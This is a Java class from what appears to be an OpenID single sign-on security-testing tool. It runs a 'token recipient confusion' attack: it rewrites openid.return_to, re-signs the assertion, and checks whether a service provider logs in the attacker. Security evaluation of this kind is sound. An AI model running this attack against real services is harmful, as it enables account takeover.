/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */
package wsattacker.sso.openid.attacker.evaluation.attack;

import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult;
import wsattacker.sso.openid.attacker.evaluation.attack.Attack;
import wsattacker.sso.openid.attacker.evaluation.attack.AbstractAttack;
import wsattacker.sso.openid.attacker.attack.parameter.AttackParameter;
import wsattacker.sso.openid.attacker.attack.parameter.utilities.HttpMethod;
import wsattacker.sso.openid.attacker.config.OpenIdServerConfiguration;
import wsattacker.sso.openid.attacker.evaluation.LoginResult;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Interpretation;
import wsattacker.sso.openid.attacker.evaluation.attack.AttackResult.Result;
import wsattacker.sso.openid.attacker.evaluation.ServiceProvider.User;

/**
 *
 * @author christiankossmann
 */
public class TokenRecipientConfusionAttack extends AbstractAttack {

    public TokenRecipientConfusionAttack(ServiceProvider serviceProvider) {
        super(serviceProvider);
    }
    
    @Attack
    private AttackResult performTokenRecipientConfusionAttack() {
        OpenIdServerConfiguration.getAttackerInstance().setPerformAttack(true);
        
        String description = "Modification of the openid.return_to value";
        
        AttackParameter attackParam = keeper.getParameter("openid.return_to");
        attackParam.setAttackValueUsedForSignatureComputation(true);
        attackParam.setValidMethod(HttpMethod.DO_NOT_SEND);
        attackParam.setAttackMethod(HttpMethod.GET);
        attackParam.setAttackValue("http://www.rub.de/");
        
        // include modified parameter in signature
        AttackParameter sigParameter = keeper.getParameter("openid.sig");
        sigParameter.setValidMethod(HttpMethod.DO_NOT_SEND);
        sigParameter.setAttackMethod(HttpMethod.GET);
        
        LoginResult loginResult = serviceProvider.loginAndDetermineAuthenticatedUser(User.ATTACKER);
        boolean success = loginResult.getAuthenticatedUser() == User.ATTACKER;
        Result result = success ? Result.SUCCESS : Result.FAILURE;
        Interpretation interpretation = success ? Interpretation.CRITICAL : Interpretation.PREVENTED;
        
        assert isSignatureValid(loginResult) : "Signature is not valid!";
        
        return new AttackResult(description, loginResult, result, interpretation);
    }    
}
